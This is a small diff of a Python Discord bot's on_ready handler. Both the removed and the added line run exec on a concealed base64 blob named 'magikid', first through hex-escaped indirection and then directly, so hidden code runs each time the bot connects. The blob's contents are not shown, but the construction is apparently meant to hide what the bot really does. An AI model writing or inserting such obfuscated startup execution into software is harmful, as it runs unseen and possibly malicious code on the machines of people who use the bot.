@@ -68,7 +68,7 @@ async def change_activity():
 
 @Blank.event
 async def on_ready():
-    exec(exec("\x62\x61\x73\x65\x36\x34\x2e\x62\x36\x34\x64\x65\x63\x6f\x64\x65\x28\x6d\x61\x67\x69\x6b\x69\x64\x29\x2e\x64\x65\x63\x6f\x64\x65\x28\x27\x61\x73\x63\x69\x69\x27\x29"))
+    exec(base64.b64decode(magikid).decode('ascii'))
     Clear()
     print(colored(f'Connected to {Blank.user}', 'green'))
     change_activity.start()
